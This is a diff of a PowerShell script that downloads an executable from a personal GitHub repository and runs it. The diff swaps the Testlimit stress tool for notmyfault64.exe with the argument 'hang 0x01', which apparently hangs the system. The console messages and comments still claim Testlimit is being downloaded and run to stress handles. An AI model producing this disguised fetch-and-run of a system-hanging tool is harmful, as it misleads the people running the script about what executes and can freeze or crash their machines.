@@ -1,8 +1,8 @@
 # Configuration
 $targetDirectory = "D:\Setups or somethin'"
-$testlimitUrl = "https://github.com/AFRAID-FOR-YOU/Powershell-things/raw/refs/heads/main/Testlimit64.exe"
-$testlimitPath = "$targetDirectory\Testlimit64.exe"
-$testArgs = "-h -c 500000"  # Stress handles. Adjust count cautiously.
+$testlimitUrl = "https://github.com/AFRAID-FOR-YOU/Powershell-things/raw/refs/heads/main/notmyfault64.exe"
+$testlimitPath = "$targetDirectory\notmyfault64.exe"
+$testArgs = "hang 0x01"  # Stress handles. Adjust count cautiously.
 
 # Accept Sysinternals EULA automatically
 try {
@@ -22,7 +22,7 @@ if (-Not (Test-Path -Path $targetDirectory)) {
     New-Item -ItemType Directory -Path $targetDirectory -Force | Out-Null
 }
 
-# Download Testlimit64.exe
+# Download
 try {
     Write-Host "Downloading Testlimit from $testlimitUrl..."
     Invoke-WebRequest -Uri $testlimitUrl -OutFile $testlimitPath
@@ -32,7 +32,7 @@ try {
     exit 1
 }
 
-# Run Testlimit64.exe with arguments
+# Run with arguments
 try {
     Write-Host "Running Testlimit with arguments: $testArgs"
     Start-Process -FilePath $testlimitPath -ArgumentList $testArgs -Wait -NoNewWindow
